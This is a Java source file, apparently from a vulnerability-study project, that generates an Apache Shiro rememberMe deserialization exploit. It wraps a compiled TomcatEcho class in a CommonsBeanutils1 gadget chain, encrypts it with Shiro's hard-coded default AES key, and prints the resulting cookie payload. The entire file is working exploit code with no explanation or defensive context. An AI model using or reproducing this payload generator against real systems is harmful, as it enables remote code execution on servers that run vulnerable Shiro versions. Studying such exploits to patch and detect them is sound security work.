package com.govuln.shiroattack;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Client1 {
    public static void main(String []args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(TomcatEcho.class.getName());
        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
